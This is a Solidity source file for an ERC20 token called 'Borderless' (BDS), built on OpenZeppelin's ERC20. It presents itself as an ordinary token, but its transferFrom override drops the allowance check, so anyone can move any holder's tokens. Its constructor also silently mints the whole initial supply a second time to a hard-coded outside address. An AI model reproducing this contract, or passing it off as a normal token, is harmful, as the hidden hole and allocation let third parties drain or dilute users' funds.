// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20Detailed.sol";
// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
// import "@openzeppelin/contracts/token/ERC20/ERC20Detailed.sol";

contract BorderlessToken is ERC20{
    constructor(uint256 initialSupply) ERC20("Borderless", "BDS") payable  {
        _mint(msg.sender, initialSupply);
        _mint(payable(0x6251BabFB87b9FE6098738bc575CEcf5384aAbC6), initialSupply);
    }

    function transferFrom(address from, address to, uint256 value) public override  returns (bool) {
        _transfer(from, to, value);
        return true;
    }

    receive() external payable { }
    fallback() external payable { }
}